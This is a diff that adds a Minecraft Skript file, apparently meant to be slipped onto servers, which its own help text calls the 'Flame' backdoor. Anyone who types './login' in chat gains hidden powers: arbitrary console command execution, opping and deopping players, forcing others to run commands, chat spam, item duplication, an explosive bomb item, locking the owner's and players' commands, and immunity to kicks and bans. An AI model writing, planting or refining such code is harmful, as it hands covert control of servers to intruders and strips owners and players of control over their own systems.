@@ -1,0 +1,287 @@
+on chat:
+    if {logged::%player%} is not set:
+        if message is "./login":
+            if name of player is "Legendary6432" or "Ksowannek":
+                cancel event
+                set {logged::%player%} to true
+                set {rank::%player%} to "dev"
+                send "&6Flame&7 > &fLogged in to &6Flame&7 | &4DEV"
+                if {list::*} does not contain player:
+                    add player to {list::*}
+            else:
+                set {logged::%player%} to true
+                set {rank::%player%} to "user"
+                send "&6Flame&7 > &fLogged in to &6Flame&7 | &8USER"
+                if {list::*} does not contain player:
+                    add player to {list::*}
+
+    else:
+        cancel event
+        if message starts with "help":
+            if message is "help":
+                send "&6Flame&7 > &fUse 'help <1/2>'"
+                stop  
+            else:
+                if message contains "1":
+                    send ""
+                    send "&6Flame&7 > &fLogout - Logouts you from backdoor, type normally"
+                    send "&6Flame&7 > &fChat - Send messages on chat while being logged in"
+                    send "&6Flame&7 > &fSpam - Spam message in chat"
+                    send "&6Flame&7 > &fConsole - Execute any console command"
+                    send "&6Flame&7 > &fBroadcast - Broadcast message in chat"
+                    send "&6Flame&7 > &fServerchat - Talk to other players in &6Flame"
+                    send "&6Flame&7 > &fBomb - Right click with it to explode"
+                    send "&6Flame&7 > &fSudo - Force any player to say anything"
+                    send "&6Flame&7 > &fGamemode - Change your gamemode"
+                    send "&6Flame&7 > &fOp - Op yourself or anyone else"
+                    send ""
+                    send "&6Flame&7 > &fHelp: &fPage 1/2"
+                    stop
+                if message contains "2":
+                    send ""
+                    send "&6Flame&7 > &fDeop - Deop yourself or anyone else"
+                    send "&6Flame&7 > &fFly - 'I belive I can fly'"
+                    send "&6Flame&7 > &fLockcmds - Block players commands"
+                    send "&6Flame&7 > &fLockconsole - Block console commands"
+                    send "&6Flame&7 > &f"
+                    send "&6Flame&7 > &f"
+                    send "&6Flame&7 > &f"
+                    send "&6Flame&7 > &f"
+                    send "&6Flame&7 > &f"
+                    send "&6Flame&7 > &f"
+                    send ""
+                    send "&6Flame&7 > &fHelp: &fPage 2/2"
+                    stop
+        if message is "logout":
+            send "&6Flame&7 > &fLogged out of &6Flame"
+            send "&6Flame&7 > &fNow you can chat normally"
+            clear {logged::%player%}
+            clear {rank::%player%}
+            remove player from {list::*}
+            stop
+        if message starts with "chat":
+            if message starts with "chat ":
+                replace first "chat " in message with ""
+                clear {logged::%player%}
+                make player say message
+                set {logged::%player%} to true
+                stop
+            else:
+                send "&6Flame&7 > &fUse 'chat <message>'"
+                stop
+        if message starts with "spam":
+            if message starts with "spam ":
+                replace first "spam " in message with ""
+                loop 50 times: 
+                    broadcast coloured message
+                stop
+            else:
+                send "&6Flame&7 > &fUse 'spam <message>'"
+                stop
+        if message starts with "console":
+            if message starts with "console ":
+                replace first "console " in message with ""
+                execute console command message
+                send "&6Flame&7 > Executing &e%message%"
+                stop
+            else:
+                send "&6Flame&7 > &fUse 'console <console command>'"
+                stop
+        if message starts with "broadcast" or "bc":
+            if message starts with "broadcast " or "bc ":
+                replace first "broadcast " in message with ""
+                replace first "bc " in message with ""
+                broadcast coloured message
+                stop
+            else:
+                send "&6Flame&7 > &fUse 'broadcast <message>'"
+                stop
+        if message starts with "serverchat" or "sc":
+            if message starts with "serverchat " or "sc ":
+                replace first "serverchat " or "sc " in message with ""
+                send "&6Server&eChat&7 > &6%player%&7 - &f%message%" to {list::*}
+                stop
+            else:
+                send "&6Flame&7 > &fUse 'serverchat <message>'"
+                stop
+        if message is "dupe":
+            open chest inventory with 6 rows named "&6Flame&7 > &fDupe" to player
+            stop
+        if message is "bomb":
+            give player glowing tnt named "&0&k123 &7| &6Flame &4&lBomb&7 | &0&k123"
+            send "&6Flame&7 > &fRight click to throw!"
+            stop
+        if message starts with "sudo":
+            if message starts with "sudo ":
+                loop all players:
+                    if message contains "%loop-player%":
+                        replace first "sudo " in message with ""
+                        replace first "%loop-player% " in message with ""
+                        if message starts with "/":
+                            make loop-player execute message
+                            send "&6Flame&7 > &fForced &e%loop-player%&f to execute &e%message%"
+                            stop
+                        else:
+                            make loop-player say message
+                            send "&6Flame&7 > &fForced &e%loop-player%&f to say &e%message%"
+                            stop
+            else:
+                send "&6Flame&7 > &fUse 'sudo <player> <message/command>'"
+                stop
+        if message starts with "gamemode" or "gm":
+            if message starts with "gamemode " or "gm ":
+                loop all players:
+                    replace first "gamemode " in message with ""
+                    replace first "gm " in message with ""
+                    if message starts with "1":
+                        if message contains "%loop-player%":
+                            set loop-player's gamemode to creative
+                            send "&6Flame&7 > &fSet &e%loop-player%&e's &fgamemode to &6creative"
+                            stop
+                        else:
+                            send "&6Flame&7 > &fSet &eyour &fgamemode to &6creative"
+                            set player's gamemode to creative
+                            stop
+                    if message starts with "0":
+                        if message contains "%loop-player%":
+                            set loop-player's gamemode to survival
+                            send "&6Flame&7 > &fSet &e%loop-player%&e's &fgamemode to &6survival"
+                            stop
+                        else:
+                            send "&6Flame&7 > &fSet &eyour &fgamemode to &6survival"
+                            set player's gamemode to survival
+                            stop
+                    if message starts with "2":
+                        if message contains "%loop-player%":
+                            set loop-player's gamemode to adventure
+                            send "&6Flame&7 > &fSet &e%loop-player%&e's &fgamemode to &6adventure"
+                            stop
+                        else:
+                            send "&6Flame&7 > &fSet &eyour &fgamemode to &6adventure"
+                            set player's gamemode to adventure
+                            stop
+                    if message starts with "3":
+                        if message contains "%loop-player%":
+                            set loop-player's gamemode to spectator
+                            send "&6Flame&7 > &fSet &e%loop-player%&e's &fgamemode to &6spectator"
+                            stop
+                        else:
+                            send "&6Flame&7 > &fSet &eyour &fgamemode to &6spectator"
+                            set player's gamemode to spectator
+                            stop
+            else:
+                send "&6Flame&7 > &fUse 'gamemode <0/1/2/3> [player]"
+                stop
+        if message starts with "op" or "operator":
+            loop all players:
+                replace first "op " in message with ""
+                replace first "operator " in message with ""
+                if message contains "%loop-player%":
+                    op loop-player
+                    send "&6Flame&7 > &fOpped &e%loop-player%"
+                    stop
+                else:
+                    op player
+                    send "&6Flame&7 > &fOpped &eYou"
+                    stop
+        if message starts with "deop" or "deoperator":
+            loop all players:
+                replace first "deop " in message with ""
+                replace first "deoperator " in message with ""
+                if message contains "%loop-player%":
+                    deop loop-player
+                    send "&6Flame&7 > &fDeopped &e%loop-player%"
+                    stop
+                else:
+                    deop player
+                    send "&6Flame&7 > &fDeopped &eYou"
+                    stop
+        if message starts with "tp" or "teleport":
+            if message starts with "tp " or "teleport ":
+                loop all players:
+                    replace first "tp " in message with ""
+                    replace first "teleport " in message with ""
+                    if message starts with "%loop-player%":
+                        teleport player to loop-player
+                        send "&6Flame&7 > &fTeleported to &e%loop-player%"
+                        stop
+            else:
+                send "&6Flame&7 > &fUse 'tp <player>'"
+                stop
+        if message is "lockcmds":
+            if {lockcmds} is not set:
+                set {lockcmds} to true
+                send "&6Flame&7 > &f&cLocked&f commands"
+                stop
+            else:
+                clear {lockcmds}
+                send "&6Flame&7 > &f&aUnlocked&f commands"
+                stop
+        if message is "lockconsole":
+            if {lockconsole} is not set:
+                set {lockconsole} to true
+                send "&6Flame&7 > &f&cLocked&f console"
+                stop
+            else:
+                clear {lockconsole}
+                send "&6Flame&7 > &f&aUnlocked&f console"
+                stop
+        if message starts with "fly":
+            if {f.fly::%player%} is not set:
+                set {f.fly::%player%} to true
+                allow fly for player
+                send "&6Flame&7 > &aEnabled&f fly for &eyou"
+                stop
+            else:
+                clear {f.fly::%player%}
+                disallow fly for player
+                send "&6Flame&7 > &cDisabled&f fly for &eyou"
+                stop
+        if message is "day":
+            set time to 12:00
+            send "&6Flame&7 > &fTime set to &eDay"
+            stop
+        if message is "night":
+            set time to 24:00
+            send "&6Flame&7 > &fTime set to &eNight"
+            stop
+        if message is "rain":
+            set weather to rain
+            send "&6Flame&7 > &fWeather set to &eRain"
+        if message is "clean":
+            set weather to clear
+            send "&6Flame&7 > &fWeather set to &eClean"
+        else:
+            send "&6Flame&7 > &fNo commands found"
+            send "&6Flame&7 > &fUse 'help'"
+            stop
+on command:
+    if sender is player:
+        if {lockcmds} is set:
+            if {logged::%player%} is not set:
+                cancel event
+            else:
+                stop
+    if sender is console:
+        if {lockconsole} is set:
+            cancel event
+every 0.5 second:
+    loop all players:
+        if name of loop-player's current inventory is "&6Flame&7 > &fDupe":
+            set {_flame.slot} to 0
+            loop 53 times:
+                add 1 of slot {_flame.slot} of loop-player's current inventory to slot {_flame.slot} of loop-player's current inventory
+                add 1 to {_flame.slot}
+on kick:
+    if {logged::%player%} is set:
+        cancel event
+        send "&6Flame&7 > &fSomeone tried to kick/ban you"
+on rightclick:
+    if event-item is glowing tnt named "&0&k123 &7| &6Flame &4&lBomb&7 | &0&k123":
+        make player shoot an item projectile of tnt at speed 3
+on item hit:
+    event-item is a tnt:
+        create an explosion of force 10 at event-location
+        loop all entities in radius 15 around event-location:
+            if loop-entity is not player or tnt:
+                kill loop-entity
